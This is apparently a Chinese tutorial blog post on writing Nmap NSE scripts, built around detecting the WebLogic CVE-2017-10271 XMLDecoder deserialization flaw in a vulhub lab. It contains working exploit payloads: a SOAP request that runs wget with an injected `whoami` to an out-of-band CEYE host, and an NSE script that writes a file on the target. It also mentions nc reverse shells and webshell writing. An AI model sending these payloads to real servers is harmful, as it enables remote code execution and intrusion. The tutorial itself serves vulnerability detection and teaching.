#  

nmap为我们提供了较为精准的端口和服务探测的功能，如果我们在探测到某些端口或者服务的同时顺带检测下是否含有曾经爆出的漏洞呢？本期将以Weblogic <
10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞为例子，为大家介绍如何用NSE来编写渗透脚本。

## 0x01 http 库的介绍

由于本次Weblogic 反序列化漏洞这个例子是以HTTP请求的方式来发送POC和相关请求，所以需要先掌握http库的使用。

 **1\. 实现一个HTTP中的get方法**

    
    
    local http = require "http"
    local req = http.get(host, port, path, options)
    

http库的get方法可以发起一个请求，请求将请求结果以一个table的形式返回。参数说明：

  * host ： 要请求的主机
  * port ： 要请求的主机的端口
  * path ：要请求的路径
  * options ：一个table的格式，可以定义socket超时时间、HTTP 的请求头部字段或者其他的参数

 **2\. 实现一个HTTP中的post方法**

    
    
    local http = require "http"
    local req = http.post(host, port, path, options, ignored, postdata)
    

post方法支持的参数有6个，相同的4个和get方式一样。不同与GET的参数说明：

  * ignored ： 忽略向下兼容。此参数斗哥也不太理解，一般置为`nil`
  * postdata ：POST数据，可以是字符串或者是一个table。默认会以`application/x-www-form-encoded`编码方式提交，如果不想使用此方法，需要改写`generic_request`这个方法。

 **3\. 获取返回内容**

  * req.status ： HTTP返回包的状态码
  * req.header / req.rawheader：整个返回包头部
  * req.body ： HTTP报回报的正文

 **4\. 关于脚本调试**
**使用nmap`-d`参数**这个后面可以跟`1-9`的数字，数字越大调试信息越详细，一般`-d3`足以查看到详细的http报文了。
**使用wireshark**
利用wireshark本身的报文过滤能力，筛选出我们想要的HTTP请求包。如筛选命令：`http.request.method=="POST" and
ip.dst==192.168.1.1` 就可以筛选出发往192.168.1.1的POST请求了。

![请求.png](https://image.3001.net/images/20180320/15215282439131.png!small)  

  

## 0x02 漏洞环境搭建

环境使用的是phith0n牛的docker开源靶场：[https://github.com/vulhub，使用docker搭建漏洞环境会比较高效。](https://github.com/vulhub%EF%BC%8C%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E4%BC%9A%E6%AF%94%E8%BE%83%E9%AB%98%E6%95%88%E3%80%82)

## 0x03 漏洞POC

因为该漏洞是属于代码执行漏洞，根据这个漏洞可以文件写马或者执行系统命令。

 **文件写马POC**

利用的java的io包下的PrintWriter类：`<object class="java.io.PrintWriter">`

![ter.png](https://image.3001.net/images/20180320/15215282977364.png!small)  

该POC的路径不能出错，漏洞环境需要有写的权限。作为POC我们不必写真正的JSP马，写入无害数据到一个文件，然后判断文件是否有数据即可。

 **命令执行，反弹shell或者是利用服务监控的方式**

由于该代码执行执行系统命令并没有回显结果。所以斗哥掌握的方法一种是执行nc命令反弹一个shell回来，另外一种是通过服务监控的方式，而服务监控的方式更使用与nmap的脚本编写。

利用的java的lang包下的ProcessBuilder类：`<object class="java.lang.ProcessBuilder">`

利用CEYE，本次漏洞我们可以监控的服务有`nslookup、curl、wget、ping`等。

    
    
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
                        <soapenv:Header> 
                            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
                            <java version="1.8.0_131" class="java.beans.XMLDecoder"> 
                                <object class="java.lang.ProcessBuilder"> 
                                <array class="java.lang.String" length="2"> 
                                    <void index="0"> 
                                    <string>wget</string> 
                                    </void>  
                                    <void index="1"> 
                                    <string>`whoami`test111.xxx.ceye.io</string> 
                                    </void>  
                                </array>  
                                <void method="start"/> 
                                </object> 
                            </java> 
                            </work:WorkContext> 
                        </soapenv:Header>  
                        <soapenv:Body/> 
                    </soapenv:Envelope>
    

![e  1.png](https://image.3001.net/images/20180320/15215287498947.png!small)  

![e  2.png](https://image.3001.net/images/20180320/15215287668919.png!small)  

  

##0x04 NSE脚本脚本的POC使用的是通过写入无害数据到文件，检测文件是否存在的方式。如果要使用监控服务的方式，只需更换POC即可。

nmap命令：`nmap -Pn -p7001 --script weblogic_cve2017_10271 192.168.1.0/24`

![24.png](https://image.3001.net/images/20180320/15215288331504.png!small)

    
    
    local http = require "http"
    local shortport = require "shortport"
    local string = require "string"
    
    description = [[检测Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞（CVE-2017-10271）]]
    author = "reborn"
    license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
    categories = {"default","safe","discovery","version"}
    
    portrule = function(host,port)
        return port.protocol == "tcp" and port.state == "open"
    end
    
    action = function(host, port)
    
        print("port.numner is : ",port.number)
        print("port status is : ",port.state)
        local basepath = "/wls-wsat/CoordinatorPortType"
    
        math.randomseed(tostring(os.time()):reverse():sub(1, 7)) --设置时间种子
        local randomnum = math.random(1000000,9999999)  -- 生成一个随机数,POC需要具有随机性
    
        local randomurl = '/wls-wsat/' .. tostring(randomnum) .. '.txt'
    
        print(randomurl)
    
        local postdata='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/' .. tostring(randomnum) .. '.txt</string><void method="println"><string>xmldecodetest</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
    
        local options={ header = {    -- HTTP头部的编写格式
        ["Accept-Encoding"]="en",
        ["Accept"]="*/*",
        ["User-Agent"] = "Mozilla/5.0",
        ["Content-Length"]=638,
        ["Content-Type"]="text/xml",
        ["Expect"]="100-continue",
        ["Connection"]="Keep-Alive"
        } }
    
        local req = http.get(host,port,basepath,{ no_cache = true})  -- 检测是否存在/wls-wsat/CoordinatorPortType路径的请求
        local reqw= http.post(host,port,basepath,options,nil,postdata)  -- 发送POC的请求 
        local reqr= http.get(host,port,randomurl,{ no_cache = true}) -- 检测POC是否成功写入文件的请求
    
        if string.find(reqr.body,'xmldecodetest') ~= nil  -- 如果写入的文件有xmldecodetest字段，说明漏洞存在
        then
            return "Vuln Detect CVE-2017-10271 ,Weblogic < 10.3.6 'wls-wsat' XMLDecoder"
        end
    
        if string.find(req.body,'CoordinatorPortType') ~= nil  -- 如果存在/wls-wsat/CoordinatorPortType路径，说明可能存在风险
        then
            return "Vuln Warning .. Detect PATH: /wls-wsat/CoordinatorPortType ,Mabey CVE-2017-10271 ,Weblogic < 10.3.6 'wls-wsat' XMLDecoder"
        end
    end
    

## 0x05 小结

本期如何利用NSE编写攻击脚本到这里结束了，主要和大家介绍了下斗哥的一些经验总结，下期呢将为大家介绍Nmap中的并发执行。

![qrcode_for_gh_223e082fe8a7_344.jpg](https://image.3001.net/images/20180320/15215288811567.jpg!small)  

